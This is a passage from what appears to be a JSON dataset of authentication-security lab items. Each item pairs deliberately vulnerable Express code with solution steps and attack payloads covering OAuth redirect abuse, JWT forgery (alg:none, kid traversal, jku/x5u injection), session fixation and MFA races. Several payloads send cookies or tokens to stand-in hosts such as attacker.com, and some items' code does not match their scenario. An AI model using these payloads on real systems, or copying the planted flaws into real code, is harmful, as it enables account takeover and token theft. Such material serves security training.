        "srcCode": "const express = require('express');\nconst app = express();\n\nconst authCodes = {};\nconst usedStates = new Set();\n\napp.get('/oauth/callback', (req, res) => {\n  const {code, state} = req.query;\n  authCodes[code] = {state, valid: true};\n  res.redirect(`/exchange?code=${code}&state=${state}`);\n});\n\napp.post('/oauth/token', (req, res) => {\n  const {code, state} = req.body;\n  if (authCodes[code]?.valid && !usedStates.has(state)) {\n    usedStates.add(state);\n    res.json({access_token: 'freshToken'});\n  } else {\n    res.status(400).json({error: 'Invalid request'});\n  }\n});\n\napp.listen(3000);",
        "payloads": [
            "/oauth/token\nContent-Type: application/x-www-form-urlencoded\n\ncode=SplxlO&state=newState123",
            "{\"code\":\"abc123\",\"state\":\"injected_state\",\"grant_type\":\"authorization_code\"}",
            "POST /token\ncode=MzFjNTk5&state=hijacked_state&client_id=legit_client"
        ]
    },
    {
        "Lab scenario": "Session fixation through WebSocket handshake hijacking",
        "Lab Description": "The WebSocket authentication handshake accepts arbitrary session identifiers. The application [assigns privileged sessions based on unvalidated WS-Session headers during WebSocket upgrades]. To solve: [fixate a privileged session ID through WebSocket handshake manipulation and hijack admin access].",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Intercept WebSocket upgrade request using Burp Suite",
            "Inject WS-Session header with predictable session ID",
            "Capture valid admin session cookie through XSS or phishing",
            "Reuse captured session ID in WebSocket handshake",
            "Verify admin access by subscribing to privileged WebSocket channels"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst WebSocket = require('ws');\nconst app = express();\n\nconst server = app.listen(3000);\nconst wss = new WebSocket.Server({ server });\n\nwss.on('connection', (ws, req) => {\n  const sessionId = req.headers['ws-session'] || Math.random().toString(36).substring(2);\n  \n  db.findSession(sessionId, (err, session) => {\n    if (session?.admin) {\n      ws.send('ADMIN_ACCESS_GRANTED');\n    }\n  });\n});",
        "payloads": [
            "GET /ws HTTP/1.1\nHost: vulnerable.com\nUpgrade: websocket\nConnection: Upgrade\nWS-Session: admin-fixed-session\nSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\nSec-WebSocket-Version: 13",
            "{\"headers\":{\"WS-Session\":\"stolen-session-id\"}}",
            "wss://vulnerable.com/ws?session_id=injected-admin-session"
        ]
    },
    {
        "Lab scenario": "JWT algorithm confusion via jwk header injection",
        "Lab Description": "The JWT validation endpoint is vulnerable to algorithm confusion attacks through JWK header injection. The application [trusts client-provided JWK headers when verifying tokens signed with symmetric keys]. To solve: [forge a valid admin token by injecting a malicious JWK header and signing with the public key as if it were HMAC].",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Intercept valid JWT using Burp Suite and analyze header structure",
            "Extract public key from application's /jwks.json endpoint",
            "Craft new token with jwk header containing extracted public key",
            "Sign token using public key as HMAC secret with HS256 algorithm",
            "Verify admin access by submitting forged token to /admin-api"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\nconst publicKey = '-----BEGIN PUBLIC KEY-----\\nMFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBA...';\n\napp.post('/verify-token', (req, res) => {\n  const token = req.body.token;\n  const decoded = jwt.decode(token, {complete: true});\n  \n  let key = publicKey;\n  if (decoded.header.jwk) {\n    key = decoded.header.jwk;\n  }\n  \n  jwt.verify(token, key, (err, payload) => {\n    res.json({admin: payload?.admin || false});\n  });\n});\n\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiT...In0.eyJ1c2VyIjoiYWRtaW4iLCJhZG1pbiI6dHJ1ZX0.FakeSig",
            "{\"token\":\"eyJhbGciOiJIUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsIm4iOi...\"}",
            "POST /verify-token\nContent-Type: application/json\n\n{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiT...\"}"
        ]
    },
    {
        "Lab scenario": "OAuth token leakage through misconfigured CORS",
        "Lab Description": "The OAuth token endpoint has overly permissive CORS headers, allowing token theft from malicious sites. The application [exposes access tokens through CORS-enabled responses without proper origin validation]. To solve: [craft a cross-domain request to steal OAuth tokens and use them to access protected resources].",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Identify permissive CORS headers on /oauth/token endpoint using OWASP ZAP",
            "Create malicious HTML page with XMLHttpRequest to token endpoint",
            "Trick authenticated user into visiting malicious page",
            "Capture leaked token in server logs or through exfiltration",
            "Use stolen token to access user data through API"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst cors = require('cors');\nconst app = express();\n\napp.use(cors({\n  origin: '*',\n  methods: ['GET','POST'],\n  allowedHeaders: ['Content-Type','Authorization'],\n  exposedHeaders: ['Access-Token']\n}));\n\napp.post('/oauth/token', (req, res) => {\n  res.json({\n    access_token: 'sensitive-token-value',\n    token_type: 'bearer'\n  });\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>\n  var xhr = new XMLHttpRequest();\n  xhr.open('POST', 'https://vulnerable.com/oauth/token', true);\n  xhr.withCredentials = true;\n  xhr.onload = function() { exfiltrate(xhr.responseText); };\n  xhr.send('grant_type=client_credentials');\n</script>",
            "fetch('https://vulnerable.com/oauth/token', {\n  method: 'POST',\n  credentials: 'include',\n  body: 'grant_type=password&username=admin&password=123'\n}).then(r => r.json()).then(data => sendToAttacker(data));",
            "var iframe = document.createElement('iframe');\niframe.src = 'https://vulnerable.com/oauth/token?grant_type=implicit';\ndocument.body.appendChild(iframe);"
        ]
    },
    {
        "Lab scenario": "Session fixation through HTTP/2 header compression",
        "Lab Description": "The application's HTTP/2 implementation leaks session IDs through header compression side channels. The application [assigns session IDs before authentication and maintains them through HPACK compression contexts]. To solve: [analyze HPACK compression ratios to fixate and hijack privileged sessions].",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Capture HTTP/2 traffic using Wireshark with SSL key logging",
            "Analyze HPACK header tables for session ID patterns",
            "Fixate session ID by reusing compression contexts",
            "Brute-force session IDs through compression ratio analysis",
            "Hijack valid session by matching compression characteristics"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const http2 = require('http2');\nconst fs = require('fs');\n\nconst server = http2.createSecureServer({\n  key: fs.readFileSync('server.key'),\n  cert: fs.readFileSync('server.crt')\n});\n\nserver.on('stream', (stream, headers) => {\n  let sessionId = headers['session-id'] || Math.random().toString(36).substring(2);\n  \n  stream.respond({\n    ':status': 200,\n    'set-cookie': `SESSION=${sessionId}`,\n    'content-type': 'text/html'\n  });\n  \n  stream.end('<html>Logged in with session: '+sessionId+'</html>');\n});\n\nserver.listen(443);",
        "payloads": [
            "GET / HTTP/2\nHost: vulnerable.com\nsession-id: fixed-session-123\n\n",
            "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n\nHEADERS\n:method: GET\n:path: /\n:scheme: https\nsession-id: brute-force-payload\n",
            "HTTP/2 200 OK\ncontent-type: text/html\nset-cookie: SESSION=injected-session\n\n<html>...</html>"
        ]
    },
    {
        "Lab scenario": "JWT alg:none bypass in REST API authentication",
        "Lab Description": "The lab's JWT-based authentication fails to validate the algorithm properly. The application accepts unsigned tokens when the 'alg' header is set to 'none'. To solve: craft a modified JWT to gain admin access without knowing the secret key.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Intercept valid JWT token using Burp Suite while logging in as low-privilege user",
          "Decode the JWT structure using jwt.io or Burp Decoder",
          "Modify the algorithm header to 'none' and change the role claim to 'admin'",
          "Remove the signature portion (set to empty string after the last dot)",
          "Send the modified token in Authorization header to /admin endpoint"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, process.env.SECRET, { algorithms: ['HS256'] });\n    if (decoded.role === 'admin') {\n      res.send('Admin dashboard');\n    } else {\n      res.status(403).send('Forbidden');\n    }\n  } catch (err) {\n    try {\n      const decoded = jwt.decode(token, { complete: true });\n      if (decoded?.header?.alg === 'none') {\n        if (decoded.payload.role === 'admin') {\n          res.send('Admin dashboard');\n          return;\n        }\n      }\n      res.status(401).send('Invalid token');\n    } catch {\n      res.status(401).send('Invalid token');\n    }\n  }\n});\napp.listen(3000);",
        "payloads": [
          "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.",
          "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."
        ]
      },
      {
        "Lab scenario": "OAuth token leakage via misconfigured callback in SPA",
        "Lab Description": "The OAuth implementation leaks authorization codes through URL fragments in single-page applications. The application fails to validate the redirect_uri properly. To solve: intercept the OAuth flow and steal the victim's token through an open redirect.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to intercept the OAuth authorization request",
          "Modify the redirect_uri parameter to point to attacker-controlled domain",
          "Set up a web server to capture incoming OAuth callbacks",
          "Craft malicious link with poisoned redirect_uri and social engineer victim",
          "Extract authorization code from callback URL and exchange for access token"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\nconst clients = {'client1': {secret: 's3cr3t', redirectURIs: ['https://legit.com/callback']}};\napp.get('/oauth/authorize', (req, res) => {\n  const {client_id, redirect_uri, state} = req.query;\n  if (!clients[client_id]) return res.status(400).send('Invalid client');\n  const authCode = 'random_code_' + Math.random().toString(36).substring(2);\n  res.redirect(`${redirect_uri}#code=${authCode}&state=${state}`);\n});\napp.post('/oauth/token', (req, res) => {\n  const {code, client_id, client_secret} = req.body;\n  if (clients[client_id]?.secret === client_secret) {\n    res.json({access_token: 'fake_token', token_type: 'Bearer'});\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\napp.listen(3001);",
        "payloads": [
          "https://oauth-server.com/oauth/authorize?response_type=code&client_id=client1&redirect_uri=https://attacker.com/capture&state=123",
          "https://oauth-server.com/oauth/authorize?response_type=token&client_id=client1&redirect_uri=https://evil.com/steal#&state=xyz"
        ]
      },
      {
        "Lab scenario": "GraphQL batching attack against authentication rate limiting",
        "Lab Description": "The GraphQL endpoint processes batched queries without proper rate limiting checks. The application fails to count each authentication attempt separately in a batch. To solve: bypass login attempt restrictions using query batching to brute-force credentials.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Capture normal login attempt using Postman with GraphQL content-type",
          "Craft batch query with 100+ login attempts in single request",
          "Use Python script to generate permutations of common passwords",
          "Monitor responses for differing status codes indicating success",
          "Extract valid credentials from successful attempt response"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst schema = buildSchema(`\n  type Query {\n    login(username: String!, password: String!): Boolean\n  }\n`);\nconst root = {\n  login: ({username, password}) => {\n    if (username === 'admin' && password === 'SuperSecret123!') {\n      return true;\n    }\n    return false;\n  }\n};\nconst app = express();\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  graphiql: true\n}));\napp.listen(4000);",
        "payloads": [
          "[{\"query\":\"mutation { login(username: \\\"admin\\\", password: \\\"guess1\\\") }\",\"variables\":{}},{\"query\":\"mutation { login(username: \\\"admin\\\", password: \\\"guess2\\\") }\",\"variables\":{}}]",
          "{\"query\":\"mutation { attempt1: login(username: \\\"admin\\\", password: \\\"pass1\\\") attempt2: login(username: \\\"admin\\\", password: \\\"pass2\\\") attempt3: login(username: \\\"admin\\\", password: \\\"pass3\\\") }\"}"
        ]
      },
      {
        "Lab scenario": "Session fixation via XSS in OAuth callback handler",
        "Lab Description": "The OAuth implementation suffers from session fixation combined with DOM-based XSS in the callback handler. The application fails to regenerate session tokens after OAuth flow completion. To solve: chain XSS with session fixation to hijack an admin session.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to identify XSS in the redirect_uri parameter of /oauth/callback",
          "Craft malicious link with XSS payload that extracts session cookies",
          "Fixate session by forcing victim to authenticate via your malicious OAuth state",
          "Trigger the XSS payload after victim completes OAuth flow",
          "Capture admin session token from your attacker server logs"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst crypto = require('crypto');\nconst app = express();\napp.use(require('cookie-parser')());\n\nconst sessions = {};\n\napp.get('/oauth/callback', (req, res) => {\n  const {code, state, redirect_uri} = req.query;\n  if (!validateOAuthCode(code)) return res.status(400).send('Invalid code');\n  \n  const sessionId = req.cookies.session || state;\n  sessions[sessionId] = {user: 'admin'};\n  \n  res.cookie('session', sessionId);\n  res.send(`<script>window.location='${redirect_uri}'</script>`);\n});\n\napp.listen(3000);",
        "payloads": [
          "https://victim.com/oauth/callback?code=123&state=attacker_session&redirect_uri=javascript:fetch('https://attacker.com/steal?cookie='+document.cookie)",
          "https://victim.com/oauth/callback?code=123&state=fixed_session&redirect_uri=data:text/html,<script>location.href='https://attacker.com/?cookie='+document.cookie</script>"
        ]
      },
      {
        "Lab scenario": "JWT kid header path traversal in microservice authentication",
        "Lab Description": "The JWT verification uses the kid header to load verification keys without proper sanitization. The application allows directory traversal in key file paths. To solve: craft a JWT signed with a predictable local file's contents to gain admin access.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Capture valid JWT using Burp Suite and note kid header usage",
          "Identify predictable key file locations (/dev/null, /proc/self/environ)",
          "Craft JWT with kid pointing to /dev/null and alg set to HS256",
          "Sign token with empty string (contents of /dev/null)",
          "Replace original token with forged one in Authorization header"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, (header, callback) => {\n      fs.readFile(`./keys/${header.kid}`, (err, key) => {\n        callback(null, key || 'default_key');\n      });\n    });\n    if (decoded.role === 'admin') res.send('Admin access granted');\n    else res.status(403).send('Forbidden');\n  } catch (e) {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(3001);",
        "payloads": [
          "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uL2Rldi9udWxsIn0.eyJyb2xlIjoiYWRtaW4ifQ.dfeqg_9ZQ8t4bFJk7P3X7yZ1lT4nY7Xv8t8Qe3q9j0M",
          "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii9wcm9jL3NlbGYvZW52aXJvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.1yB3L7L9eF3N9Q7YJ1kP5rT7wV9xZ2C4bD6fV8j0H"
        ]
      },
      {
        "Lab scenario": "MFA bypass via race condition in verification state",
        "Lab Description": "The multi-factor authentication suffers from a race condition where the verification state isn't properly synchronized. The application uses a global variable to track MFA status. To solve: send parallel requests to bypass MFA by winning the race condition.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Postman to capture normal MFA verification flow",
          "Create multiple concurrent requests to /verify-mfa endpoint",
          "Use Burp Turbo Intruder to send 100+ parallel requests",
          "Monitor for successful login despite invalid codes",
          "Access protected resource with session from winning request"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\nlet mfaVerified = false;\n\napp.post('/verify-mfa', (req, res) => {\n  const {code} = req.body;\n  if (code === '123456') {\n    mfaVerified = true;\n    res.send('Verified');\n  } else {\n    mfaVerified = false;\n    res.status(403).send('Invalid code');\n  }\n});\n\napp.get('/dashboard', (req, res) => {\n  if (mfaVerified) {\n    res.send('Sensitive data');\n    mfaVerified = false;\n  } else {\n    res.status(403).send('MFA required');\n  }\n});\n\napp.listen(3002);",
        "payloads": [
          "POST /verify-mfa HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"code\":\"111111\"}",
          "POST /verify-mfa HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"code\":\"000000\"}"
        ]
      },
      {
        "Lab scenario": "JWT public key substitution via jku header injection",
        "Lab Description": "The JWT validation improperly trusts the jku header to fetch verification keys from external URLs. The application fails to validate the jku domain. To solve: host a malicious JWKS file and craft a JWT that forces the server to use your public key for verification.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Intercept valid JWT using Burp Suite and observe jku header usage",
          "Set up attacker-controlled server hosting JWKS with your public key",
          "Craft JWT with modified payload and jku pointing to your server",
          "Sign the token with your private key matching the JWKS",
          "Submit forged token to bypass authentication as admin"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst axios = require('axios');\nconst app = express();\n\napp.post('/admin', async (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.decode(token, {complete: true});\n    const jku = decoded?.header?.jku;\n    if (jku) {\n      const {data: jwks} = await axios.get(jku);\n      const key = jwks.keys[0].x5c[0];\n      jwt.verify(token, key);\n      if (decoded.payload.role === 'admin') {\n        res.send('Admin access granted');\n        return;\n      }\n    }\n    res.status(403).send('Forbidden');\n  } catch (e) {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(3000);",
        "payloads": [
          "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXItY29udHJvbGxlZC5jb20vbWFsd2FyZS5qa3MifQ.eyJyb2xlIjoiYWRtaW4ifQ.fake_signature",
          "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vZXZpbC5zaXRlL2p3a3MifQ.eyJ1c2VyIjoiYWRtaW4ifQ.invalid_sig"
        ]
      },
      {
        "Lab scenario": "OAuth token leakage via insecure custom URI scheme",
        "Lab Description": "The mobile OAuth implementation uses insecure custom URI schemes for redirects, allowing token interception. The application fails to validate redirect URIs properly. To solve: register a malicious URI handler and intercept tokens from deep links.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use OWASP ZAP to intercept OAuth flow from mobile client",
          "Identify custom URI scheme (app://oauth-callback)",
          "Register malicious URI handler on attacker device",
          "Modify redirect_uri to use custom scheme with attacker domain",
          "Capture OAuth tokens when victim authenticates"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\n\nconst clients = {\n  'mobileApp': {\n    secret: 'client_secret',\n    redirectURIs: ['app://oauth-callback', 'https://legit.com/callback']\n  }\n};\n\napp.get('/oauth/authorize', (req, res) => {\n  const {client_id, redirect_uri, state} = req.query;\n  if (!clients[client_id]?.redirectURIs.includes(redirect_uri)) {\n    return res.status(400).send('Invalid client or redirect URI');\n  }\n  res.redirect(`${redirect_uri}#access_token=fake_token&state=${state}`);\n});\n\napp.listen(3001);",
        "payloads": [
          "https://oauth-server.com/oauth/authorize?response_type=token&client_id=mobileApp&redirect_uri=app://evil.com&state=123",
          "https://oauth-server.com/oauth/authorize?response_type=code&client_id=mobileApp&redirect_uri=app://attacker/steal&state=xyz"
        ]
      },
      {
        "Lab scenario": "Session fixation via WebSocket authentication handshake",
        "Lab Description": "The WebSocket upgrade process accepts existing session IDs without regeneration. The application authenticates WebSocket connections using cookies without proper session rotation. To solve: fixate session via HTTP then upgrade to WebSocket with same session.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to capture WebSocket handshake process",
          "Fixate session ID by setting cookie in initial HTTP request",
          "Initiate WebSocket connection using same session cookie",
          "Bypass authentication by reusing fixated session",
          "Access privileged WebSocket channels"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst WebSocket = require('ws');\nconst app = express();\n\nconst sessions = {};\n\napp.use((req, res, next) => {\n  req.sessionId = req.cookies.session || Math.random().toString(36).substring(2);\n  sessions[req.sessionId] = sessions[req.sessionId] || {authenticated: false};\n  res.cookie('session', req.sessionId);\n  next();\n});\n\napp.post('/login', (req, res) => {\n  sessions[req.sessionId].authenticated = true;\n  res.send('Logged in');\n});\n\nconst server = app.listen(3002);\nconst wss = new WebSocket.Server({server});\n\nwss.on('connection', (ws, req) => {\n  const sessionId = req.headers.cookie?.match(/session=([^;]+)/)?.[1];\n  if (sessions[sessionId]?.authenticated) {\n    ws.send('Privileged WebSocket access granted');\n  } else {\n    ws.close();\n  }\n});",
        "payloads": [
          "GET / HTTP/1.1\r\nHost: victim.com\r\nCookie: session=attacker_controlled_id\r\n\r\n",
          "GET /ws HTTP/1.1\r\nHost: victim.com\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nCookie: session=fixated_id\r\n\r\n"
        ]
      },
      {
        "Lab scenario": "JWT role escalation via nested token injection",
        "Lab Description": "The JWT implementation improperly processes nested JSON structures in token claims. The application fails to properly sanitize nested objects in the JWT payload. To solve: craft a JWT with nested role objects to escalate privileges to admin.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Intercept valid JWT using Burp Suite and decode its structure",
          "Identify role claim processing in backend code via error messages",
          "Craft JWT with nested role object: {'role': {'name': 'admin'}}",
          "Sign the modified token using the same algorithm (HS256)",
          "Submit forged token to access admin functionality"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, 'weak_secret_key');\n    const role = decoded.role?.name || decoded.role;\n    if (role === 'admin') {\n      res.send('Admin dashboard accessed');\n    } else {\n      res.status(403).send('Forbidden');\n    }\n  } catch (e) {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(3000);",
        "payloads": [
          "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6eyJuYW1lIjoiYWRtaW4ifX0.fake_signature",
          "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjp7ImFjY2VzcyI6ImFkbWluIn19.invalid_sig"
        ]
      },
      {
        "Lab scenario": "OAuth token hijacking via state parameter reflection",
        "Lab Description": "The OAuth implementation reflects the state parameter without validation in the redirect URL. The application fails to maintain state server-side. To solve: craft a malicious link that captures victim's OAuth tokens via reflected state.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use OWASP ZAP to analyze OAuth flow and state parameter usage",
          "Construct malicious URL with state parameter containing XSS payload",
          "Social engineer victim to click the link and authenticate",
          "Capture OAuth tokens when victim is redirected to attacker's site",
          "Use stolen tokens to impersonate victim"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/oauth/callback', (req, res) => {\n  const {code, state} = req.query;\n  res.redirect(`${state}#access_token=fake_token&code=${code}`);\n});\n\napp.listen(3001);",
        "payloads": [
          "https://oauth-server.com/oauth/authorize?response_type=code&client_id=client1&state=https://attacker.com/steal",
          "https://oauth-server.com/oauth/authorize?response_type=token&client_id=client1&state=javascript:fetch('https://attacker.com/log?token='+document.location.hash)"
        ]
      },
      {
        "Lab scenario": "Session fixation via GraphQL WebSocket connection",
        "Lab Description": "The GraphQL subscription endpoint accepts existing session cookies for WebSocket connections without regeneration. The application fails to rotate session identifiers during WebSocket upgrade. To solve: fixate session via HTTP then establish GraphQL subscription with same session.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to capture GraphQL WebSocket handshake",
          "Fixate session ID by setting cookie in initial HTTP request",
          "Initiate GraphQL WebSocket connection using same session cookie",
          "Subscribe to privileged data streams using fixated session",
          "Exfiltrate sensitive data via subscription channel"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst { createServer } = require('http');\nconst { SubscriptionServer } = require('subscriptions-transport-ws');\nconst { execute, subscribe } = require('graphql');\n\nconst app = express();\nconst sessions = {};\n\napp.use((req, res, next) => {\n  req.sessionId = req.cookies.session || Math.random().toString(36).substring(2);\n  sessions[req.sessionId] = sessions[req.sessionId] || {user: 'guest'};\n  res.cookie('session', req.sessionId);\n  next();\n});\n\napp.post('/login', (req, res) => {\n  sessions[req.sessionId].user = 'admin';\n  res.send('Logged in');\n});\n\nconst server = createServer(app);\n\nSubscriptionServer.create(\n  {\n    execute,\n    subscribe,\n    onConnect: (connectionParams, websocket) => {\n      const sessionId = websocket.upgradeReq.headers.cookie?.match(/session=([^;]+)/)?.[1];\n      return {session: sessions[sessionId]};\n    }\n  },\n  {server}\n);\n\nserver.listen(3002);",
        "payloads": [
          "GET / HTTP/1.1\r\nHost: victim.com\r\nCookie: session=attacker_controlled_id\r\n\r\n",
          "CONNECT /graphql HTTP/1.1\r\nHost: victim.com\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nCookie: session=fixated_id\r\n\r\n"
        ]
      },
      {
        "Lab scenario": "JWT algorithm confusion via x5u header injection",
        "Lab Description": "The JWT implementation trusts x5u header to fetch verification certificates without proper validation. The application fails to verify the certificate chain when switching from HMAC to RSA. To solve: host a malicious certificate and force the server to verify tokens using your public key.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Intercept valid JWT using Burp Suite and decode structure",
          "Generate RSA key pair and self-signed certificate",
          "Host malicious certificate at attacker-controlled domain",
          "Craft JWT with x5u pointing to your certificate and alg set to RS256",
          "Sign token with your private key and submit to bypass authentication"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst axios = require('axios');\nconst app = express();\n\napp.post('/admin', async (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.decode(token, {complete: true});\n    if (decoded.header.x5u) {\n      const {data: cert} = await axios.get(decoded.header.x5u);\n      jwt.verify(token, cert);\n      if (decoded.payload.role === 'admin') {\n        res.send('Admin access granted');\n        return;\n      }\n    }\n    res.status(403).send('Forbidden');\n  } catch (e) {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(3000);",
        "payloads": [
          "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL21hbGljaW91cy5jZXJ0In0.eyJyb2xlIjoiYWRtaW4ifQ.fake_signature",
          "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHBzOi8vZXZpbC5zaXRlL2NlcnQifQ.eyJ1c2VyIjoiYWRtaW4ifQ.invalid_sig"
        ]
      },
      {
        "Lab scenario": "OAuth token leakage via insecure postMessage handler",
        "Lab Description": "The OAuth popup implementation uses postMessage without proper origin validation. The application fails to verify the message source when processing OAuth tokens. To solve: craft a malicious page that intercepts tokens via postMessage event listeners.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use OWASP ZAP to analyze OAuth flow in popup window",
          "Create malicious HTML page with postMessage event listener",
          "Social engineer victim to open your page after initiating OAuth",
          "Capture OAuth tokens when they're posted to your window",
          "Use stolen tokens to impersonate victim"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/oauth/callback', (req, res) => {\n  const {code} = req.query;\n  res.send(`<script>\n    window.opener.postMessage({oauth_token: '${code}'}, '*');\n    window.close();\n  </script>`);\n});\n\napp.listen(3001);",
        "payloads": [
          "<iframe src=\"https://oauth-server.com/oauth/authorize?response_type=token&client_id=victim\"></iframe>\n<script>window.addEventListener('message',e=>{fetch('https://attacker.com/steal?token='+e.data.oauth_token)})</script>",
          "<script>window.open('https://oauth-server.com/oauth/authorize?response_type=code&client_id=victim','oauth','width=500,height=600');\nwindow.addEventListener('message',e=>{document.location='https://attacker.com/exfil?data='+btoa(JSON.stringify(e.data))})</script>"
        ]
      },
      {
        "Lab scenario": "Session fixation via HTTP/2 Server Push headers",
        "Lab Description": "The HTTP/2 implementation pushes session cookies without proper validation. The application assigns session IDs during resource push before authentication. To solve: intercept HTTP/2 push stream to fixate session then authenticate with known credentials.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite with HTTP/2 support to intercept traffic",
          "Analyze Server Push frames for early Set-Cookie headers",
          "Capture and reuse pushed session ID before authentication",
          "Authenticate with valid credentials using fixated session",
          "Access privileged resources with established session"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst spdy = require('spdy');\nconst app = express();\n\napp.use((req, res, next) => {\n  if (!req.cookies.session) {\n    res.set('Link', '</styles.css>; rel=preload; as=style');\n    res.cookie('session', Math.random().toString(36).substring(2));\n  }\n  next();\n});\n\napp.post('/login', (req, res) => {\n  if (req.body.user === 'admin' && req.body.pass === 'S3cr3t!') {\n    res.send('Logged in');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\nconst server = spdy.createServer({}, app);\nserver.listen(3002, () => {\n  console.log('HTTP/2 server running');\n});",
        "payloads": [
          "GET / HTTP/2\r\nHost: victim.com\r\n\r\n",
          "POST /login HTTP/2\r\nHost: victim.com\r\nCookie: session=attacker_controlled_id\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nuser=admin&pass=S3cr3t!"
        ]
      },
      {
        "Lab scenario": "JWT alg:none bypass in REST API authentication",
